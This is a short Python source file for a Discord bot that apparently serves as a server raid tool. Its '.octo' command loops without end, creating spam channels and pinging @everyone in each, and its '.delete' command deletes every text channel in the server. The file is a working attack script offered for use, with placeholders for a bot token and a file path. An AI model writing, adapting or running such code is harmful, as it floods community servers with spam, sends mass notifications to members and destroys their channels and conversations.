#by kamushy
#read github description 
import discord
from discord.ext import commands

client = commands.Bot(command_prefix=".")

#read github description 

@client.command()
async def octo(ctx):
    guild = ctx.guild
    username = ctx.message.author.name
    
    #Enter file path in the ''
    await ctx.send(file=discord.File(r'enter you file path here'))
    while 1 == 1:
        channel = await guild.create_text_channel(f"flooded-by, {username}")

        em = discord.Embed(title = "Nillumocto", description = "\n", color=0x0ff41)
        em.add_field(name="https://github.com/Kamushy/nillumocto", value="Coded by kamushy" )
        await channel.send(embed = em)
        await channel.send("@everyone")

#dont need to change this
@client.command()
async def delete(ctx):
    await ctx.reply("Channels deleting now, as you wish")
    guild = ctx.guild
    for channel in guild.text_channels:
        await channel.delete()

#Add token here, read github description if confused
client.run('add your token here')
